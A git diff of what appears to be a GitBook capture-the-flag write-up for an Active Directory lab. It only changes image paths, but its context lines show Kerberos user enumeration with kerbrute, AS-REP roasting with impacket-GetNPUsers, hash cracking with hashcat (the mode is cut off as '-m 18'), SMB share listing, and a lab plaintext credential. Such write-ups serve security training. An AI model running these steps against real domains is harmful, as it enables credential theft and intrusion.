@@ -14,7 +14,7 @@ kerbrute
  ./kerbrute_linux_amd64 userenum -d spookysec.local --dc 10.10.176.12  userlist.txt 
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 impacket-GetNPUsers
 
@@ -22,7 +22,7 @@ impacket-GetNPUsers
 impacket-GetNPUsers spookysec.local/svc-admin -dc-ip 10.10.176.12
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 hashcat
 
@@ -30,7 +30,7 @@ hashcat
 hashcat -m 18
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### smbclient
 
@@ -38,13 +38,13 @@ hashcat -m 18
 smbclient -L //10.10.176.12  -U "svc-admin"
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 smb://ip/backup
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 backup@spookysec.local:backup2517860
